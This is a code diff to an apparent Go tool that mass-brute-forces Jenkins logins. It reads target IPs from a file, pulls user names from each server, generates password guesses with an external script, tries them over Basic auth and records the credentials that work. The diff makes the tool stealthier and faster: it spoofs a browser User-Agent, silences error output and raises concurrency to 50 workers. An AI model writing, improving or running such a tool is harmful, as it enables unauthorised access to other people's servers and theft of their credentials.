@@ -20,9 +20,9 @@ import (
 )
 
 type Results struct {
-	Good          []IpUserPass `json:"good"`
-	TotalIP       int          `json:"total_ip"`
-	CurrentCursor int          `json:"current_cursor"`
+	Good          []IpUserPass
+	TotalIP       int
+	CurrentCursor int
 }
 
 var Data Results
@@ -36,6 +36,11 @@ type IpUserPass struct {
 var (
 	resultsFile   *os.File
 	resultsFileMu sync.Mutex
+)
+
+var (
+	errorsFile   *os.File
+	errorsFileMu sync.Mutex
 )
 
 var (
@@ -67,7 +72,7 @@ func countTotalNoOfIP(ipFile string) (int, error) {
 }
 
 var httpClient = &http.Client{
-	Timeout: 5 * time.Second,
+	Timeout: 10 * time.Second,
 	Transport: &http.Transport{
 		TLSClientConfig: &tls.Config{
 			InsecureSkipVerify: true,
@@ -82,7 +87,7 @@ func checkJenkinsCreds(ctx context.Context, input IpUserPass) error {
 	}
 	auth := base64.StdEncoding.EncodeToString([]byte(input.User + ":" + input.Password))
 	req.Header.Set("Authorization", "Basic "+auth)
-	req.Header.Set("User-Agent", "Go-http-client")
+	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36")
 
 	resp, err := httpClient.Do(req)
 	if err != nil {
@@ -93,12 +98,12 @@ func checkJenkinsCreds(ctx context.Context, input IpUserPass) error {
 	switch resp.StatusCode {
 	case 200:
 		if err := saveResults(input.IP, input.User, input.Password); err != nil {
-			fmt.Printf("saveResults failed for %s: %v\n", input.IP, err)
+			// saveResults failed
 		}
 		return ErrFoundValidCreds
 	case 403:
 		if err := saveResults(input.IP, input.User, input.Password); err != nil {
-			fmt.Printf("saveResults failed for %s: %v\n", input.IP, err)
+			// saveResults failed
 		}
 		return ErrFoundValidCreds
 	default:
@@ -118,6 +123,20 @@ func openResultsFile() (*os.File, error) {
 		resultsFile = file
 	}
 	return resultsFile, nil
+}
+
+func openErrorsFile() (*os.File, error) {
+	errorsFileMu.Lock()
+	defer errorsFileMu.Unlock()
+
+	if errorsFile == nil {
+		file, err := os.OpenFile("errors.txt", os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
+		if err != nil {
+			return nil, err
+		}
+		errorsFile = file
+	}
+	return errorsFile, nil
 }
 
 var goodMu sync.Mutex
@@ -157,12 +176,32 @@ func saveResults(IP, Username, Password string) error {
 	return nil
 }
 
+func saveError(IP, errorMsg string) error {
+	errorsFile, err := openErrorsFile()
+	if err != nil {
+		return err
+	}
+
+	errorsFileMu.Lock()
+	defer errorsFileMu.Unlock()
+
+	_, err = errorsFile.WriteString(IP + "\n")
+	if err != nil {
+		return err
+	}
+
+	err = errorsFile.Sync()
+	if err != nil {
+		return err
+	}
+	return nil
+}
+
 func generatePasswords(parlai, urlai string, ctx context.Context) <-chan string {
 	cmd := exec.CommandContext(ctx, "./psudohash.sh", "-w", urlai, "-o", parlai)
 	err := cmd.Run()
 
 	if err != nil {
-		fmt.Printf("Error executing external application: %v\n", err)
 		ch := make(chan string)
 		close(ch)
 		return ch
@@ -170,7 +209,6 @@ func generatePasswords(parlai, urlai string, ctx context.Context) <-chan string 
 
 	file, err := os.Open(parlai)
 	if err != nil {
-		fmt.Printf("Error opening password file %s: %v\n", parlai, err)
 		ch := make(chan string)
 		close(ch)
 		return ch
@@ -199,7 +237,7 @@ func generatePasswords(parlai, urlai string, ctx context.Context) <-chan string 
 			}
 		}
 		if err := scanner.Err(); err != nil {
-			fmt.Printf("Error reading password file: %v\n", err)
+			// Error reading password file
 		}
 
 	}()
@@ -215,7 +253,9 @@ func generateRandomNumber() int {
 func processCredsForIP(parentCtx context.Context, ip string, workers int) error {
 	users, err := ExtractingUser(parentCtx, ip)
 	if err != nil {
-		fmt.Printf("Skipping IP %s due to ExtractingUser error: %v\n", ip, err)
+		if saveErr := saveError(ip, err.Error()); saveErr != nil {
+			// Failed to save error
+		}
 		return nil
 	}
 
@@ -408,7 +448,7 @@ func ExtractingUser(ctx context.Context, input string) ([]string, error) {
 	if err != nil {
 		return nil, fmt.Errorf("error creating request: %v", err)
 	}
-	req.Header.Set("User-Agent", "Go-http-client")
+	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36")
 
 	resp, err := httpClient.Do(req)
 	if err != nil {
@@ -449,13 +489,12 @@ func ExtractingUser(ctx context.Context, input string) ([]string, error) {
 func main() {
 	total, err := countTotalNoOfIP("ips.txt")
 	if err != nil {
-		fmt.Println("count error:", err)
 		return
 	}
 	Data.TotalIP = total
 
 	//   Menu: Set number of workers
-	ipWorkers := 12
+	ipWorkers := 50
 
 	processFunc := func(ctx context.Context, ip string, workers int) error {
 		return processCredsForIP(ctx, ip, workers)
